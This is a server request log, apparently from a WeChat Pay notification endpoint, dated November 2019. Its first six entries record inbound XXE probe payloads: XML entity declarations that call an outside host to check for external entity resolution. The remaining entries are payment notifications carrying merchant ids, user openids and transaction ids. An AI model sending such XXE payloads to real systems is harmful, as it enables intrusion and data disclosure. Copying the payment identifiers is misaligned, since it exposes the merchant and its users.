03:14:05|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111403_714?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:14:06|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111403_714?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:26:30|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111403_714?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:26:30|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111403_714?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:36:38|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111403_714?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:36:38|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111403_714?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
11:58:25|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dccd0d65bbb1]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[253062704788416401301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[7C727A1D4DD00C576A51AAD20858DD57]]></sign>
<time_end><![CDATA[20191114115824]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000459201911146599570032]]></transaction_id>
</xml>'
| GET:array (
)
11:58:25|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dccd0d65bbb1',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '253062704788416401301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '7C727A1D4DD00C576A51AAD20858DD57',
  'time_end' => '20191114115824',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000459201911146599570032',
)
| GET:array (
)
11:59:35|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dccd1205b1c4]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[251062704795952701301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[8F92ADF24D2368BC6E96D04CD63AFDC1]]></sign>
<time_end><![CDATA[20191114115934]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000465201911147229300867]]></transaction_id>
</xml>'
| GET:array (
)
11:59:35|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dccd1205b1c4',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '251062704795952701301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '8F92ADF24D2368BC6E96D04CD63AFDC1',
  'time_end' => '20191114115934',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000465201911147229300867',
)
| GET:array (
)
12:24:09|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dccd6d9db865]]></nonce_str>
<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
<out_trade_no><![CDATA[251062704942818701401]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[0C61F843467ED808BA0BCB7DBD88A737]]></sign>
<time_end><![CDATA[20191114122408]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000464201911149220271581]]></transaction_id>
</xml>'
| GET:array (
)
12:24:09|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dccd6d9db865',
  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
  'out_trade_no' => '251062704942818701401',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '0C61F843467ED808BA0BCB7DBD88A737',
  'time_end' => '20191114122408',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000464201911149220271581',
)
| GET:array (
)
12:44:53|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dccdbb3d95b7]]></nonce_str>
<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
<out_trade_no><![CDATA[224062705066861101401]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[F950EC9FDF160A538C5310FF7138A55C]]></sign>
<time_end><![CDATA[20191114124452]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000456201911145718922795]]></transaction_id>
</xml>'
| GET:array (
)
12:44:53|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dccdbb3d95b7',
  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
  'out_trade_no' => '224062705066861101401',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'F950EC9FDF160A538C5310FF7138A55C',
  'time_end' => '20191114124452',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000456201911145718922795',
)
| GET:array (
)
12:50:09|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dccdcfaa00da]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[279062705099676901301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[2DB932B767A4DA3CE6F75EAF1D6E7839]]></sign>
<time_end><![CDATA[20191114125008]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000462201911143425292991]]></transaction_id>
</xml>'
| GET:array (
)
12:50:09|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dccdcfaa00da',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '279062705099676901301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '2DB932B767A4DA3CE6F75EAF1D6E7839',
  'time_end' => '20191114125008',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000462201911143425292991',
)
| GET:array (
)
13:31:21|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dcce6a334e56]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[229062705347068501301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[9D8D0E51DC15E1AE438497D7BDD76A58]]></sign>
<time_end><![CDATA[20191114133120]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000468201911148373973844]]></transaction_id>
</xml>'
| GET:array (
)
13:31:21|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dcce6a334e56',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '229062705347068501301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '9D8D0E51DC15E1AE438497D7BDD76A58',
  'time_end' => '20191114133120',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000468201911148373973844',
)
| GET:array (
)
13:32:24|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[380]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dcce6e0ecad7]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[245062705352877001301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[2EA63DFC28F1415830784A7892B12D48]]></sign>
<time_end><![CDATA[20191114133223]]></time_end>
<total_fee>380</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000462201911141303852501]]></transaction_id>
</xml>'
| GET:array (
)
13:32:24|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '380',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dcce6e0ecad7',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '245062705352877001301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '2EA63DFC28F1415830784A7892B12D48',
  'time_end' => '20191114133223',
  'total_fee' => '380',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000462201911141303852501',
)
| GET:array (
)
19:15:33|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[GRCB_DEBIT]]></bank_type>
<cash_fee><![CDATA[5200]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5dcd3748a337d]]></nonce_str>
<openid><![CDATA[oGq4g5Vx4oml5E7nrP58sg1r2__E]]></openid>
<out_trade_no><![CDATA[260062707411450108701]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[96671540804541892496B88982093FE8]]></sign>
<time_end><![CDATA[20191114191532]]></time_end>
<total_fee>5200</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000469201911144110182002]]></transaction_id>
</xml>'
| GET:array (
)
19:15:33|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'GRCB_DEBIT',
  'cash_fee' => '5200',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5dcd3748a337d',
  'openid' => 'oGq4g5Vx4oml5E7nrP58sg1r2__E',
  'out_trade_no' => '260062707411450108701',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '96671540804541892496B88982093FE8',
  'time_end' => '20191114191532',
  'total_fee' => '5200',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000469201911144110182002',
)
| GET:array (
)
